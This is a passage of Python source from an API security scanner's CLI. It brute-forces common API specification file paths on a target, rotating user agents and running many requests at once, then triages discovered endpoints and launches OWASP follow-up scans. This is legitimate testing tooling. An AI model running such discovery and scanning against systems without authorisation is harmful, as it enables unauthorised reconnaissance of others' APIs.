            "from recursive discovery"
        )
    graphql_endpoint = status.get("graphql_introspection_endpoint")
    if graphql_endpoint:
        click.echo(
            f"🔎 GRAPHQL_INTROSPECTION_ENABLED: introspection is enabled on "
            f"{graphql_endpoint}"
        )
    _echo_fuzzing_stats(core)
    _echo_secret_findings(core)


def _echo_fuzzing_stats(core):
    """Surface the discovery :class:`FuzzingStats` summary line (Requirement 31.3).

    Reads the fuzzing statistics defensively via
    :meth:`APILeakCore.get_fuzzing_stats` (accessed through ``getattr`` so the
    function stays safe when called with a fake/partial ``core`` that does not
    expose the accessor, as in the discovery-control tests). When stats are
    available, prints a single line reporting endpoints tested, endpoints
    discovered, total requests, success rate, and recursion depth reached. Stays
    silent when stats are unavailable (no discovery ran).
    """
    get_stats = getattr(core, "get_fuzzing_stats", None)
    if get_stats is None:
        return
    stats = get_stats()
    if stats is None:
        return

    endpoints_tested = getattr(stats, "endpoints_tested", 0)
    endpoints_discovered = getattr(stats, "endpoints_discovered", 0)
    total_requests = getattr(stats, "total_requests", 0)
    success_rate = getattr(stats, "success_rate", 0.0)
    recursive_depth = getattr(stats, "recursive_depth_reached", 0)

    click.echo(
        f"📊 Discovery stats: {endpoints_tested} endpoint(s) tested, "
        f"{endpoints_discovered} discovered, {total_requests} request(s), "
        f"{success_rate:.1f}% success rate, recursion depth "
        f"{recursive_depth}"
    )


# ---------------------------------------------------------------------------
# Spec-file brute-force discovery — integrated into ``dir --brute-spec``.
#
# Equivalent to ``sj brute``: sends a series of HTTP GET requests to a target
# trying well-known paths where Swagger/OpenAPI/RAML/AsyncAPI definition files
# are commonly exposed.  When a candidate returns a 2xx status whose body looks
# like a valid API specification, the result is reported and (optionally)
# auto-loaded for further use.
# ---------------------------------------------------------------------------

# Signatures that identify a response body as an API spec document.
_SPEC_BODY_SIGNATURES = (
    # OpenAPI 3.x
    b'"openapi"',
    b"'openapi'",
    b"openapi:",
    # Swagger 2.x
    b'"swagger"',
    b"'swagger'",
    b"swagger:",
    # RAML
    b"#%RAML",
    # AsyncAPI
    b'"asyncapi"',
    b"asyncapi:",
    # API Blueprint
    b"FORMAT: 1A",
    # JSON:API / Hydra hints
    b'"@context"',
    # Generic doc hints
    b'"info"',
    b'"paths"',
    b'"components"',
    b'"definitions"',
    b'"basePath"',
    b'"host"',
)

# Default wordlist shipped with apileaks (relative to the script directory).
_DEFAULT_SPEC_WORDLIST = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "wordlists", "spec_files.txt"
)


def _load_spec_brute_wordlist(wordlist_path: str) -> list:
    """Load and normalise the brute-force wordlist, stripping blanks/comments."""
    entries = []
    try:
        with open(wordlist_path, encoding="utf-8") as fh:
            for line in fh:
                stripped = line.strip()
                if stripped and not stripped.startswith("#"):
                    # Normalise leading slash — we build the full URL ourselves.
                    entries.append(stripped.lstrip("/"))
    except OSError as exc:
        raise click.BadParameter(
            f"--brute-spec-wordlist cannot be read: {wordlist_path} ({exc})"
        ) from exc
    return entries


def _looks_like_spec(status_code: int, body: bytes, content_type: str) -> bool:
    """Return True when the response is likely an API specification document.

    Checks:
    1. HTTP status is 2xx.
    2. Content-Type is JSON, YAML, or plain text (spec files are never HTML-only).
    3. The body contains at least one known spec keyword.
    """
    if not (200 <= status_code < 300):
        return False

    ct = (content_type or "").lower()
    # Reject obvious HTML pages (Swagger UI HTML is not the raw spec).
    if "text/html" in ct and "json" not in ct and "yaml" not in ct:
        return False

    body_lower = body[:4096].lower()  # only inspect the first 4 KB
    return any(sig.lower() in body_lower for sig in _SPEC_BODY_SIGNATURES)


async def _brute_spec_async(
    target: str,
    entries: list,
    *,
    proxy: str = None,
    timeout: float = 10.0,
    concurrency: int = 20,
    verify_ssl: bool = True,
    jwt: str = None,
    header: tuple = (),
    user_agent_random: bool = False,
    user_agent_custom: str = None,
    output_file: str = None,
    quiet: bool = False,
) -> list:
    """Async core: probe *entries* paths under *target* and return spec hits.

    Returns a list of dicts with keys: url, status, content_type, size, spec.
    ``spec`` is True when _looks_like_spec() matched.
    """
    import asyncio as _asyncio

    import httpx

    base = target.rstrip("/")
    hits = []
    sem = _asyncio.Semaphore(concurrency)

    # Build shared headers.
    extra_headers = parse_header_options(header)
    if jwt:
        extra_headers["Authorization"] = f"Bearer {jwt}"
    if user_agent_custom:
        extra_headers["User-Agent"] = user_agent_custom
    elif user_agent_random:
        import random as _random
        _ua_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "curl/7.88.1",
            "python-httpx/0.24.0",
            "Swagger Jacker (github.com/BishopFox/sj)",
            "PostmanRuntime/7.32.2",
        ]
        extra_headers["User-Agent"] = _random.choice(_ua_pool)

    proxies = proxy if proxy else None
    total = len(entries)
    done = 0

    async with httpx.AsyncClient(
        verify=verify_ssl,
        proxy=proxies,
        timeout=timeout,
        follow_redirects=True,
        headers=extra_headers,
    ) as client:

        async def _probe(path: str):
            nonlocal done
            url = f"{base}/{path}"
            async with sem:
                try:
                    resp = await client.get(url)
                    ct = resp.headers.get("content-type", "")
                    body = resp.content
                    is_spec = _looks_like_spec(resp.status_code, body, ct)
                    result = {
                        "url": str(resp.url),
                        "status": resp.status_code,
                        "content_type": ct,
                        "size": len(body),
                        "spec": is_spec,
                    }
                    if not quiet:
                        if is_spec:
                            click.echo(
                                click.style(
                                    f"✓  {resp.status_code}  {url}  [{len(body)} bytes]  ← SPEC FOUND",
                                    fg="green", bold=True,
                                )
                            )
                        elif 200 <= resp.status_code < 300:
                            click.echo(
                                click.style(
                                    f"⚠  {resp.status_code}  {url}  [{len(body)} bytes]",
                                    fg="yellow",
                                )
                            )
                    return result
                except (httpx.RequestError, httpx.HTTPStatusError):
                    return None
                finally:
                    done += 1
                    if not quiet and sys.stdout.isatty():
                        # In-place progress counter (overwrite same line).
                        sys.stdout.write(f"\r  Probing: {done}/{total} requests sent")
                        sys.stdout.flush()

        tasks = [_probe(path) for path in entries]
        results = await _asyncio.gather(*tasks)

    if not quiet and sys.stdout.isatty():
        sys.stdout.write("\n")

    hits = [r for r in results if r is not None and r["status"] != 404]
    spec_hits = [r for r in hits if r["spec"]]
    return hits, spec_hits


def _run_spec_brute(
    target: str,
    *,
    brute_spec_wordlist: str = None,
    brute_spec_extensions: bool = False,
    proxy: str = None,
    timeout: float = 10.0,
    concurrency: int = 20,
    verify_ssl: bool = True,
    jwt: str = None,
    header: tuple = (),
    user_agent_random: bool = False,
    user_agent_custom: str = None,
    output_file: str = None,
    quiet: bool = False,
    logger=None,
):
    """Entry point for ``dir --brute-spec``.

    Loads the wordlist, probes every path under *target*, prints a summary
    table with ✓/⚠/✗ status indicators (matching sj's UX), and optionally
    writes results to a JSON file.

    Returns (hits, spec_hits) — all non-404 responses and the subset that
    look like valid spec files respectively.
    """
    if logger is None:
        logger = get_logger("brute-spec")

    # Resolve wordlist.
    wl_path = brute_spec_wordlist or _DEFAULT_SPEC_WORDLIST
    try:
        entries = _load_spec_brute_wordlist(wl_path)
    except click.BadParameter as exc:
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)

    if not entries:
        click.echo("Error: spec-brute wordlist is empty.", err=True)
        sys.exit(1)

    # Optionally expand each entry with common spec extensions.
    if brute_spec_extensions:
        extra = []
        extensions = [".json", ".yaml", ".yml"]
        for entry in entries:
            for ext in extensions:
                if not entry.endswith(ext):
                    extra.append(entry + ext)
        entries = entries + extra

    click.echo(f"\n🔍 Spec-file brute-force: {target}")
    click.echo(f"   Wordlist : {wl_path}  ({len(entries)} paths)")
    click.echo(f"   Proxy    : {proxy or 'none'}")
    click.echo(f"   Timeout  : {timeout}s   Concurrency: {concurrency}")
    click.echo("─" * 60)

    hits, spec_hits = asyncio.run(
        _brute_spec_async(
            target,
            entries,
            proxy=proxy,
            timeout=timeout,
            concurrency=concurrency,
            verify_ssl=verify_ssl,
            jwt=jwt,
            header=header,
            user_agent_random=user_agent_random,
            user_agent_custom=user_agent_custom,
            output_file=output_file,
            quiet=quiet,
        )
    )

    # ── Summary ──────────────────────────────────────────────────────────────
    click.echo("─" * 60)
    click.echo(f"\n📊 Spec-Brute Summary: {target}")
    click.echo(f"   Paths probed   : {len(entries)}")
    click.echo(f"   Non-404 hits   : {len(hits)}")
    click.echo(
        click.style(f"   Spec files found: {len(spec_hits)}", fg="green" if spec_hits else "white", bold=bool(spec_hits))
    )

    if spec_hits:
        click.echo("\n✅ API specification files discovered:")
        for hit in spec_hits:
            click.echo(
                click.style(f"   → {hit['url']}  [{hit['status']}]  {hit['size']} bytes", fg="green")
            )

    if hits and not spec_hits:
        click.echo("\n⚠️  Accessible paths found (not confirmed as spec files):")
        for hit in hits[:20]:  # cap at 20 to avoid flooding
            click.echo(f"   • {hit['url']}  [{hit['status']}]")
        if len(hits) > 20:
            click.echo(f"   … and {len(hits) - 20} more. Use --output to save full results.")

    # ── Optional JSON output ──────────────────────────────────────────────────
    if output_file and (hits or spec_hits):
        import json as _json
        os.makedirs(os.path.dirname(os.path.abspath(output_file)), exist_ok=True)
        payload = {
            "target": target,
            "wordlist": wl_path,
            "total_probed": len(entries),
            "hits": hits,
            "spec_hits": spec_hits,
        }
        with open(output_file, "w", encoding="utf-8") as fh:
            _json.dump(payload, fh, indent=2)
        click.echo(f"\n💾 Results saved: {output_file}")

    logger.info(
        "Spec-brute complete",
        target=target,
        probed=len(entries),
        hits=len(hits),
        spec_hits=len(spec_hits),
    )
    return hits, spec_hits


def _echo_secret_findings(core):
    """Surface redacted secret findings in the discovery summary (Requirement 30).

    Reads the :class:`SecretFinding` records collected during discovery via
    :meth:`APILeakCore.get_secret_findings` (read defensively). Each finding is
    displayed with its pattern name, originating endpoint/method, and the
    already-redacted matched value, so the full secret value is never echoed
    (Requirement 30.4). The summary stays silent when secret detection was
    disabled or nothing matched (Requirement 30.7).
    """
    get_findings = getattr(core, "get_secret_findings", None)
    if get_findings is None:
        return
    findings = get_findings()
    if not findings:
        return

    click.echo(
        f"🔑 SECRET_FINDINGS: {len(findings)} potential secret(s) detected "
        f"in discovery responses (values redacted):"
    )
    for finding in findings:
        endpoint = getattr(finding, "endpoint", "")
        method = getattr(finding, "method", "")
        pattern_name = getattr(finding, "pattern_name", "")
        redacted = getattr(finding, "redacted", "")
        location = f"{method} {endpoint}".strip()
        click.echo(f"   - [{pattern_name}] {location}: {redacted}")


async def _discover_endpoints_for_triage(apileak_config, discovery_progress=None,
                                        checkpoint_path=None, resume_checkpoint=None,
                                        streaming_output_path=None):
    """Run discovery for the triage workflow and return endpoints + soft-404 baseline.

    Builds an :class:`APILeakCore`, executes a scan against the configured target
    (in ``dir`` mode no OWASP modules are enabled, so this is effectively the
    endpoint discovery phase), and returns the discovered ``Endpoint`` objects so
    the caller can project them into :class:`DiscoveryResult` records, together
    with the :class:`Soft404Baseline` derived from the catch-all probes (or
    ``None`` when no baseline was captured).

    Args:
        apileak_config: The loaded APILeak configuration.
        discovery_progress: Optional live Progress_Display (Requirement 32),
            attached to the core before discovery runs so the endpoint fuzzer can
            render live progress. ``None`` (or a disabled instance) runs discovery
            without a display.

    Returns:
        A ``(endpoints, soft_404_baseline)`` tuple. ``soft_404_baseline`` is
        ``None`` when the discovery probes did not yield a single signature.
    """
    core = APILeakCore(apileak_config)

    # Attach the live Progress_Display (if any) before discovery runs so the
    # endpoint fuzzer can render it (Requirement 32).
    if discovery_progress is not None:
        core.discovery_progress = discovery_progress

    # Attach the resume/checkpoint state (Requirement 37) before discovery runs,
    # mirroring run_enhanced_apileak: ``checkpoint_path`` enables periodic writes
    # and ``resume_checkpoint`` (a pre-loaded DiscoveryCheckpoint) seeds the
    # fuzzer before discovery. Both default to None, leaving discovery unchanged.
    if checkpoint_path is not None:
        core.discovery_checkpoint_path = checkpoint_path
    if resume_checkpoint is not None:
        core.discovery_resume_checkpoint = resume_checkpoint

    # Streaming JSONL output: stash the path on the core so
    # _ensure_fuzzing_orchestrator can open the handle and attach it to the
    # EndpointFuzzer before any discovery request is issued.
    if streaming_output_path and streaming_output_path.endswith(".jsonl"):
        core.discovery_streaming_output_path = streaming_output_path

    health_status = await core.health_check()
    if health_status.get("status") != "healthy":
        get_logger("dir").warning(
            "Health check indicates issues", status=health_status
        )

    try:
        await core.run_scan(apileak_config.target.base_url)
    finally:
        # Close the streaming handle cleanly even if the scan raised.
        orchestrator = getattr(core, "fuzzing_orchestrator", None)
        fuzzer = getattr(orchestrator, "endpoint_fuzzer", None) if orchestrator else None
        if fuzzer is not None and fuzzer.streaming_output_handle is not None:
            try:
                fuzzer.streaming_output_handle.close()
            except Exception:
                pass
            fuzzer.streaming_output_handle = None

    _echo_discovery_control_status(core)

    # Reach the endpoint fuzzer defensively to derive the Soft_404_Baseline from
    # the catch-all probes that already ran (Requirement 22.5); deriving it issues
    # no extra requests. Absence of a fuzzer/baseline simply means no soft-404
    # suppression is applied.
    orchestrator = getattr(core, "fuzzing_orchestrator", None)
    fuzzer = getattr(orchestrator, "endpoint_fuzzer", None)
    soft_404_baseline = calibrate_soft_404(fuzzer) if fuzzer is not None else None

    return core.get_discovered_endpoints(), soft_404_baseline


def _select_records(
    records,
    *,
    endpoints=None,
    matchers,
    filters,
    soft_404_baseline,
):
    """Apply response selection as a post-discovery projection (Requirement 22).

    Builds in-memory-only :class:`DiscoveryResultEx` views over ``records`` (the
    persisted :class:`DiscoveryResult` projection is never widened, so the
    Requirement 14 session round-trip stays intact), applies the matchers and
    filters conjunctively (Requirements 22.2-22.4), then **independently** drops
    any record matching the Soft_404_Baseline (Requirements 22.6, 22.8). Returns
    the retained :class:`DiscoveryResult` records in their original relative
    order.

    These selections (response matchers/filters and soft-404 noise suppression)
    narrow the records that feed the table, session, export, and interactive
    selection. The existing ``Status_Code_Filter`` (Requirement 13) is applied
    separately as a **display-only** filter by the table renderer and the
    interactive prompt, so it never omits records from the persisted session or
    export (Requirement 14.1); the displayed/triaged set therefore still
    satisfies the status filter, matchers, and filters conjunctively
    (Requirement 22.7).

    When ``endpoints`` is provided it is aligned positionally with ``records``
    and supplies each view's response ``size`` and ``elapsed`` from the
    ``Endpoint``. The discovered ``Endpoint`` does not retain the response body
    text, so the word/line counts are best-effort ``0`` and the regex predicate
    sees an empty body. When ``endpoints`` is ``None`` (a reloaded session),
    those attributes default to ``0`` because the session file does not persist
    them.
    """
    if endpoints is not None:
        views = [
            DiscoveryResultEx(
                result=record,
                size=getattr(endpoint, "response_size", 0) or 0,
                words=0,   # Endpoint does not retain the response body text
                lines=0,   # Endpoint does not retain the response body text
                elapsed=getattr(endpoint, "response_time", 0.0) or 0.0,
                text="",
            )
            for record, endpoint in zip(records, endpoints, strict=False)
        ]
    else:
        views = [DiscoveryResultEx(result=record) for record in records]

    # Matchers + filters combine conjunctively (Requirements 22.2-22.4).
    selected = apply_selectors(views, matchers, filters)

    # Soft-404 suppression is applied independently of the matchers/filters and
    # of catch-all suppression: a record removed by either mechanism is excluded
    # (Requirements 22.6, 22.8).
    if soft_404_baseline is not None:
        selected = [
            view for view in selected if not soft_404_baseline.matches(view)
        ]

    return [view.result for view in selected]


def _run_dir_triage(
    *,
    target,
    wordlist_path,
    candidate_set,
    seed_methods,
    output,
    rate_limit,
    methods,
    fuzz_keyword="FUZZ",
    fuzz_mode="clusterbomb",
    marker_wordlists=None,
    user_agent_random,
    user_agent_custom,
    user_agent_file,
    jwt,
    header,
    cookie,
    basic_auth,
    response,
    status_code,
    matchers,
    filters,
    detect_framework,
    fuzz_versions,
    save_session,
    load_session,
    export_format,
    export_file,
    output_format,
    output_file,
    interactive,
    scan_scope,
    ci_mode,
    proxy,
    proxy_verify_ssl,
    client_cert=None,
    ca_bundle=None,
    allow_cross_domain_redirects=False,
    resolve=None,
    detect_secrets=False,
    secret_patterns=None,
    path_scope=None,
    storage_status=None,
    checkpoint=None,
    resume_checkpoint=None,
    openapi_sources=None,
    postman_sources=None,
    spec_methods_only=False,
    quarantine_threshold=None,
    logger,
):
    """Run the discovery triage workflow for the ``dir`` command.

    Sources :class:`DiscoveryResult` records either from a reloaded
    ``Discovery_Session_File`` (``--load-session``; the session file is the sole
    source of truth, Requirements 14.6, 14.7) or from a fresh discovery whose
    ``Endpoint`` objects are projected into records. It then parses the optional
    status filter (Requirement 13.5), renders the triage table grouped by status
    class (Requirements 15.1-15.7), saves the full record set to a session file
    when requested (Requirements 14.1, 14.2), and writes a human-readable export
    grouped by status class when requested (Requirements 14.3-14.5).

    Filter, persistence, and export failures are surfaced as CLI errors.
    """
    from rich.console import Console

    console = Console()

    try:
        # Parse the optional status filter up front so an out-of-range explicit
        # code is reported before any discovery or I/O (Requirements 13.5, 13.6).
        status_filter = parse_status_filter(status_code) if status_code else None

        # Source the Discovery_Result records: reload is the source of truth and
        # skips discovery entirely (Requirements 14.6, 14.7, 15.6, 16.5).
        endpoints = None
        soft_404_baseline = None
        if load_session:
            session = DiscoverySession.load(load_session)
            records = list(session.results)
            logger.info(
                "Loaded discovery session", path=load_session, records=len(records)
            )
        else:
            # Build the discovery configuration exactly as the standard dir path.
            user_agent_config = None
            if user_agent_random:
                user_agent_config = {'random': True}
            elif user_agent_custom:
                user_agent_config = {'custom': user_agent_custom}
            elif user_agent_file:
                user_agents = load_user_agents_from_file(user_agent_file)
                user_agent_config = {'file_list': user_agents}

            output_filename = prepare_output_filename(output)

            advanced_config = {
                'detect_framework': detect_framework,
                'fuzz_versions': fuzz_versions,
                'framework_confidence': 0.6,
            }

            status_code_filter = parse_status_codes(status_code) if status_code else None

            # Parse operator-supplied discovery headers, cookie, and basic-auth
            # so the triage discovery path applies them to every Discovery_Request
            # exactly like the standard dir path (Requirements 24.2, 24.3, 24.4).
            extra_headers = parse_header_options(header)
            if cookie:
                extra_headers['Cookie'] = cookie
            basic_auth_creds = parse_basic_auth(basic_auth)

            config_dict = create_default_config(
                target, wordlist_path, "dir", user_agent_config, output_filename,
                advanced_config, status_code_filter, extra_headers, basic_auth_creds,
            )
            config_dict['proxy'] = proxy
            config_dict['proxy_verify_ssl'] = proxy_verify_ssl
            # Thread transport/TLS options for discovery (Requirement 29) exactly
            # like the standard dir path. The CLI validators have already
            # parsed/validated these before any discovery runs.
            config_dict['client_cert'] = client_cert
            config_dict['ca_bundle'] = ca_bundle
            config_dict['resolve'] = resolve
            config_dict['fuzzing']['endpoints']['allow_cross_domain_redirects'] = allow_cross_domain_redirects

            # Thread the Secret_Detection toggle and optional custom
            # Secret_Patterns into the secret_scan config exactly like the
            # standard dir path (Requirement 30.1/30.6).
            config_dict.setdefault('secret_scan', {})
            config_dict['secret_scan']['enabled'] = detect_secrets
            if secret_patterns is not None:
                config_dict['secret_scan']['patterns'] = secret_patterns

            # Thread the merged in-memory candidate set and per-seed methods into
            # the triage discovery config exactly like the standard dir path
            # (Requirements 25.3, 25.4); None preserves the single-file path.
            if candidate_set is not None:
                config_dict['fuzzing']['endpoints']['candidate_set'] = candidate_set
                config_dict['fuzzing']['endpoints']['seed_methods'] = seed_methods

            # Spec-aware mode: attach the full SpecSchema so the EndpointFuzzer
            # sends contextually correct requests for each spec-declared route.
            _triage_spec_schema = _build_dir_spec_schema(openapi_sources, postman_sources)
            if _triage_spec_schema is not None:
                config_dict['fuzzing']['endpoints']['spec_schema'] = _triage_spec_schema
            config_dict['fuzzing']['endpoints']['spec_methods_only'] = spec_methods_only
            # Thread quarantine_threshold so --quarantine-threshold N is honored
            # in the triage (interactive/session) path just like the direct path
            # (BUG-012 fix).
            if quarantine_threshold is not None:
                config_dict['fuzzing']['endpoints']['quarantine_threshold'] = quarantine_threshold

            if rate_limit:
                config_dict['rate_limiting']['requests_per_second'] = rate_limit
            if methods:
                config_dict['fuzzing']['endpoints']['methods'] = [
                    m.strip() for m in methods.split(',')
                ]
            # Thread the resolved marker-mode selection into the triage discovery
            # config exactly like the standard dir path (Requirements 39.1, 43.1,
            # 39.3). marker_wordlists is None when the target has no keyword.
            config_dict['fuzzing']['endpoints']['fuzz_keyword'] = fuzz_keyword
            config_dict['fuzzing']['endpoints']['fuzz_mode'] = fuzz_mode
            config_dict['fuzzing']['endpoints']['marker_wordlists'] = marker_wordlists
            if jwt:
                config_dict['authentication']['contexts'][0]['token'] = jwt
                config_dict['authentication']['contexts'][0]['type'] = 'bearer'
            if response:
                config_dict['fuzzing']['response_filter'] = parse_response_codes(response)

            # Thread the storage-time Path_Scope and Storage_Status_Selection
            # onto the triage discovery config exactly like the standard dir
            # path so dropped records never enter the session/export/table
            # (Requirements 33.1-33.7). Only the live-discovery branch applies
            # these; the --load-session reload above sources records from the
            # session file and performs no discovery.
            config_dict['fuzzing']['path_scope'] = path_scope
            config_dict['fuzzing']['storage_status'] = storage_status

            config_manager = ConfigurationManager()
            apileak_config = config_manager.load_config_from_dict(config_dict)

            validation_errors = config_manager.validate_configuration()
            if validation_errors:
                logger.error("Configuration validation failed", errors=validation_errors)
                for error in validation_errors:
                    click.echo(f"Error: {error}", err=True)
                sys.exit(1)

            # Resolve the streaming output path: when the operator wants JSONL,
            # activate streaming so hits appear in real time. The same path is
            # used for both streaming AND the end-of-scan write so the file is
            # complete whether or not streaming succeeded.
            _streaming_path = None
            if output_format == "jsonl" or (output_file and output_file.endswith(".jsonl")):
                if output_file:
                    _streaming_path = output_file
                else:
                    os.makedirs("reports", exist_ok=True)
                    _streaming_path = os.path.join("reports", "discovery_output.jsonl")

            endpoints, soft_404_baseline = asyncio.run(
                _discover_endpoints_for_triage(
                    apileak_config,
                    _build_discovery_progress(
                        ci_mode, apileak_config.fuzzing.max_requests
                    ),
                    checkpoint_path=checkpoint,
                    resume_checkpoint=resume_checkpoint,
                    streaming_output_path=_streaming_path,
                )
            )
            records = [DiscoveryResult.from_endpoint(endpoint) for endpoint in endpoints]
            logger.info("Projected discovery results", records=len(records))

        # Apply response matchers/filters and soft-404 suppression as a pure
        # post-discovery projection so the table, session, export, machine
        # output, and interactive selection all see the already-selected set
        # (Requirement 22). The Status_Code_Filter stays a display-only filter
        # (applied by the table/interactive helpers below), so it never omits
        # records from the persisted session/export (Requirement 14.1). Catch-all
        # suppression (applied during recursion) and soft-404 suppression remain
        # independent mechanisms.
        records = _select_records(
            records,
            endpoints=endpoints,
            matchers=matchers,
            filters=filters,
            soft_404_baseline=soft_404_baseline,
        )

        # Render the triage table from in-memory records, applying the filter to
        # the displayed rows (Requirements 15.1-15.5, 15.7).
        table = render_triage_table(records, status_filter)
        console.print(table)

        # Persist the full record set as the source-of-truth session file. Every
        # record is written, with none omitted (Requirements 14.1, 14.2).
        if save_session:
            session = DiscoverySession(
                target=target,
                timestamp=datetime.now(UTC).isoformat(),
                tool_version=APILEAK_VERSION,
                results=records,
            )
            session.save(save_session)
            click.echo(f"💾 Discovery session saved: {save_session}")

        # Write the human-readable export grouped by status class. The export path
        # extension selects the format and an unsupported format is rejected
        # without writing anything (Requirements 14.3-14.5).
        if export_format or export_file:
            if export_file:
                export_path = export_file
            else:
                output_dir = "reports"
                os.makedirs(output_dir, exist_ok=True)
                export_path = os.path.join(output_dir, f"discovery_export.{export_format}")
            write_discovery_export(records, export_path)
            click.echo(f"📄 Discovery export written: {export_path}")

        # Write the machine-readable discovery output (CSV/JSONL). This is
        # additional to the JSON session file (which remains the reload source of
        # truth) and to the human-readable export. The output path extension
        # selects the format; an unsupported format is rejected without writing
        # anything (Requirements 31.1, 31.4) and a write failure is surfaced as a
        # CLI error (Requirement 31.5).
        if output_format or output_file:
            if output_file:
                # Pass the user-supplied path through as-is and let
                # write_discovery_output validate the extension.
                output_path = output_file
            else:
                output_dir = "reports"
                os.makedirs(output_dir, exist_ok=True)
                output_path = os.path.join(output_dir, f"discovery_output.{output_format}")
            write_discovery_output(records, output_path)
            click.echo(f"📄 Discovery output written: {output_path}")

        # Define the follow-up scan callables used by both the non-interactive
        # --scan-scope path and the interactive triage selection below.
        def _follow_up(selected):
            _run_targeted_follow_up_scan(
                selected,
                rate_limit=rate_limit,
                user_agent_random=user_agent_random,
                user_agent_custom=user_agent_custom,
                user_agent_file=user_agent_file,
                jwt=jwt,
                response=response,
                output=output,
                detect_framework=detect_framework,
                fuzz_versions=fuzz_versions,
                header=header,
                cookie=cookie,
                basic_auth=basic_auth,
                proxy=proxy,
                proxy_verify_ssl=proxy_verify_ssl,
                logger=logger,
            )

        # Batch_Scan_Scope: launch one scoped OWASP scan over N selected records,
        # rebuilding the same rate-limit/User-Agent/header/auth config the
        # originating dir invocation used (Requirements 36.1, 36.3, 36.5). An
        # empty determined scope is reported as "nothing to scan" by the helper
        # (Requirement 36.6).
        def _batch_follow_up(selected_records):
            _run_scoped_owasp_scan(
                selected_records,
                target=target,
                rate_limit=rate_limit,
                user_agent_random=user_agent_random,
                user_agent_custom=user_agent_custom,
                user_agent_file=user_agent_file,
                jwt=jwt,
                response=response,
                output=output,
                detect_framework=detect_framework,
                fuzz_versions=fuzz_versions,
                header=header,
                cookie=cookie,
                basic_auth=basic_auth,
                proxy=proxy,
                proxy_verify_ssl=proxy_verify_ssl,
                logger=logger,
            )

        # A non-interactive --scan-scope determines the Batch_Scan_Scope from all
        # matching records and drives the scoped OWASP scan directly, with no
        # interactive prompt. In CI_Mode this is the ONLY way the scope is
        # determined and it never blocks (Requirements 36.2, 36.4). The token was
        # already validated up front, so selection cannot raise here.
        if scan_scope is not None:
            scoped_records = select_scope_records(records, scan_scope)
            _batch_follow_up(scoped_records)
            return

        # Interactive triage selection (opt-in). The helper enforces the full
        # contract: it is disabled by default, never prompts in CI mode, skips an
        # empty (filtered) table, bounds invalid selections to 3 consecutive
        # attempts, launches exactly one Targeted_Follow_Up_Scan on a single
        # valid selection, and launches one Batch_Scan_Scope OWASP scan on a
        # multi-index selection (Requirements 16.1-16.4, 16.6-16.8, 36.1).
        run_interactive_triage(
            records,
            ci_mode,
            interactive,
            status_filter=status_filter,
            follow_up=_follow_up,
            batch_follow_up=_batch_follow_up,
        )

    except ValueError as exc:
        # Invalid status filter (e.g. an out-of-range explicit code) — Req 13.6.
        logger.error("Discovery triage filter error", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)
    except DiscoverySessionError as exc:
        # Session persistence/reload failures — Requirements 14.2, 14.9, 14.10.
        logger.error("Discovery session error", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)
    except DiscoveryCheckpointError as exc:
        # Checkpoint write failure during a checkpointed (and possibly resumed)
        # triage discovery run — Requirement 37.6. The atomic save leaves no
        # partial file behind; surface the descriptive message as a CLI error.
        logger.error("Discovery checkpoint error", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)
    except DiscoveryExportError as exc:
        # Unsupported/failed human-readable export — Requirement 14.4.
        logger.error("Discovery export error", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)
    except DiscoveryOutputError as exc:
        # Unsupported machine-readable output format or write failure —
        # Requirements 31.4, 31.5. UnsupportedOutputFormatError is a subclass of
        # DiscoveryOutputError, so both are surfaced here as a CLI error.
        logger.error("Discovery output error", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)
    except Exception as exc:  # noqa: BLE001 - surface any other failure as a CLI error
        logger.error("Directory triage failed", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)


class ScanScopeError(ValueError):
    """Raised when a ``--scan-scope`` value is not a recognized Status_Code_Class
    or EndpointStatus (Requirement 36.7).

    Subclasses :class:`ValueError` so the existing ``dir`` triage error handling
    surfaces it as a descriptive CLI error performing no scan.
    """


# Recognized non-interactive Batch_Scan_Scope selectors (Requirement 36.2): the
# four Status_Code_Class tokens and the two selectable EndpointStatus values.
SCAN_SCOPE_STATUS_CLASSES = ("2xx", "3xx", "4xx", "5xx")
SCAN_SCOPE_ENDPOINT_STATUSES = ("valid", "auth_required")


def select_scope_records(records, scan_scope):
    """Return every :class:`DiscoveryResult` matching the Batch_Scan_Scope token.

    The ``scan_scope`` token is one of the four Status_Code_Class values
    (``2xx``/``3xx``/``4xx``/``5xx``) or one of the selectable EndpointStatus
    values (``valid``/``auth_required``), selecting all matching records as the
    scope for an OWASP scan (Requirement 36.2). An unrecognized token raises a
    descriptive :class:`ScanScopeError` naming the value and selects nothing
    (Requirement 36.7).

    Args:
        records: The in-memory ``DiscoveryResult`` records to filter.
        scan_scope: The raw ``--scan-scope`` token.

    Returns:
        The list of records that match the scope (possibly empty).

    Raises:
        ScanScopeError: If ``scan_scope`` is not a recognized token.
    """
    token = (scan_scope or "").strip().lower()
    if token in SCAN_SCOPE_STATUS_CLASSES:
        return [r for r in records if status_code_class(r.status_code) == token]
    if token in SCAN_SCOPE_ENDPOINT_STATUSES:
        return [r for r in records if r.endpoint_status == token]
    raise ScanScopeError(
        f"Unrecognized --scan-scope value '{scan_scope}': expected one of "
        f"2xx, 3xx, 4xx, 5xx, valid, auth_required."
    )


def _parse_selection_indices(selection, count):
    """Parse a multi-index/range triage selection into sorted 1-based indices.

    Accepts comma-separated indices and inclusive ranges, e.g. ``"1,3,5"`` or
    ``"2-4"`` (and combinations like ``"1,3-5"``). Every index must fall within
    ``[1, count]``. Returns a sorted list of unique indices, or ``None`` when the
    selection is empty or contains any malformed/out-of-range token (so the
    caller treats it as an invalid selection and re-prompts).
    """
    selection = (selection or "").strip()
    if not selection:
        return None

    indices = set()
    for token in selection.split(","):
        token = token.strip()
        if not token:
            return None
        if "-" in token:
            parts = token.split("-")
            if len(parts) != 2:
                return None
            start_raw, end_raw = parts[0].strip(), parts[1].strip()
            if not (start_raw.isdigit() and end_raw.isdigit()):
                return None
            start, end = int(start_raw), int(end_raw)
            if start > end:
                return None
            for index in range(start, end + 1):
                if not 1 <= index <= count:
                    return None
                indices.add(index)
        else:
            if not token.isdigit():
                return None
            index = int(token)
